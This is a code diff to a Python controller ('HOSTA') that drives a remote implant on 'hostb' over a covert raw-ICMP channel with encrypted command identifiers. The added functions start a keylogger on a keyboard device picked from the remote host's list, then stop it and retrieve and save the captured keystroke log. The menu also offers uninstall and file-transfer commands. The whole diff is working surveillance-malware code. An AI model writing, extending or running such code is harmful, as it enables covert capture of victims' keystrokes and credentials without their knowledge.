@@ -1126,6 +1126,104 @@ def run_program(ctx: Context):
         send_socket.close()
 
 
+def start_background_logger(ctx: Context):
+    if not ctx.connected:
+        print("Not connected. Use option 1 first.")
+        return
+
+    try:
+        recv_socket = open_raw_icmp_recv_socket()
+        send_socket = open_raw_send_socket()
+    except PermissionError:
+        ctx.error_message = "permission denied (raw sockets require sudo)"
+        handle_error(ctx)
+        return
+
+    try:
+        send_icmp_identifier(send_socket, ctx.source_ip, ctx.destination_ip,
+                             encrypt_identifier(CMD_RUN_BG, ctx.key), 1)
+
+        print("Waiting for keyboard list from hostb...")
+
+        if not wait_for_ack_ready(recv_socket, ctx.destination_ip, ctx.key,
+                                  READY_TIMEOUT_SECONDS):
+            print("No ready ack from hostb.")
+            return
+
+        device_list_bytes = receive_byte_stream_chunked(
+            recv_socket, send_socket, ctx.source_ip, ctx.destination_ip,
+            ctx.key, METADATA_TIMEOUT_SECONDS
+        )
+        if device_list_bytes is None:
+            print("Failed to receive device list.")
+            return
+
+        print("\n=== Keyboards on hostb ===")
+        print(device_list_bytes.decode("utf-8", errors="replace"))
+        print("=========================")
+
+        choice = input("Select device number> ").strip()
+        if not choice:
+            print("Cancelled.")
+            return
+
+        if not send_byte_stream_chunked(send_socket, recv_socket,
+                                        ctx.source_ip, ctx.destination_ip,
+                                        ctx.key, choice.encode("utf-8")):
+            print("Failed to send choice.")
+            return
+
+        print("Background logger started successfully.")
+
+    finally:
+        recv_socket.close()
+        send_socket.close()
+
+
+def stop_background_logger(ctx: Context):
+    if not ctx.connected:
+        print("Not connected.")
+        return
+
+    try:
+        recv_socket = open_raw_icmp_recv_socket()
+        send_socket = open_raw_send_socket()
+    except PermissionError:
+        ctx.error_message = "permission denied (raw sockets require sudo)"
+        handle_error(ctx)
+        return
+
+    try:
+        send_icmp_identifier(send_socket, ctx.source_ip, ctx.destination_ip,
+                             encrypt_identifier(CMD_STOP_BG, ctx.key), 1)
+
+        if not wait_for_ack_ready(recv_socket, ctx.destination_ip, ctx.key,
+                                  READY_TIMEOUT_SECONDS):
+            print("No ready ack from hostb.")
+            return
+
+        log_bytes = receive_byte_stream_chunked(
+            recv_socket, send_socket, ctx.source_ip, ctx.destination_ip,
+            ctx.key, REQUESTED_FILE_TIMEOUT_SECONDS
+        )
+        if log_bytes is None:
+            print("Failed to receive log.")
+            return
+
+        log_text = log_bytes.decode("utf-8", errors="replace")
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        log_path = f"hotkey_{timestamp}.log"
+
+        with open(log_path, "w", encoding="utf-8") as f:
+            f.write(log_text)
+
+        print(f"\n=== Received Background Log ===\n{log_text}\n=== Saved to {log_path} ===")
+
+    finally:
+        recv_socket.close()
+        send_socket.close()
+
+
 if __name__ == "__main__":
     print("--------------- HOSTA ---------------")
     ctx = Context()
@@ -1150,11 +1248,11 @@ if __name__ == "__main__":
             print("\nSending uninstall command...")
             send_command(ctx, CMD_UNINSTALL)
         elif choice == "4":
-            print("\nSending run background command...")
-            send_command(ctx, CMD_RUN_BG)
+            print("\nStarting background logger...")
+            start_background_logger(ctx)
         elif choice == "5":
-            print("\nSending stop background command...")
-            send_command(ctx, CMD_STOP_BG)
+            print("\nStopping background logger and retrieving log...")
+            stop_background_logger(ctx)
         elif choice == "6":
             print("\nTransferring file to hostb...")
             transfer_file(ctx)
